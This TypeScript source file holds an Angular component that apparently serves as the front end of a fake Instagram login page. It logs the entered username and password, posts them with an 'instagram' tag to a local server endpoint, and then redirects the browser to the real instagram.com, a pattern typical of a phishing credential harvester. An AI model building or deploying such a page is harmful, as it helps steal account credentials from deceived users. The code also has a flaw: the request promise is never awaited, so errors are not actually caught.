import { Component } from '@angular/core';
import { HttpClient } from '@angular/common/http'; 

@Component({
  selector: 'app-instagram',
  templateUrl: './instagram.component.html',
  styleUrls: ['./instagram.component.css']
})
export class InstagramComponent {
  app: string = 'instagram';
  loginName: string = '';
  pass: string = '';

  constructor(private http: HttpClient) {} 
  
  navigate(){
    if (this.loginName.length > 5 && this.pass.length > 8) {
      console.log(this.loginName)
      console.log(this.pass)
      window.location.href = 'https://www.instagram.com/';
    }
  }

  register() {
    const username = this.loginName;
    const password = this.pass;
    const app = this.app;
    
    try {
      const response = this.http.post('http://localhost:3000/register', { username, password, app }).toPromise();  
      alert('Registro bem-sucedido!');
    } catch (error) {
      console.error(error);
      alert('Erro ao registrar usuário.');
    }
  }
}
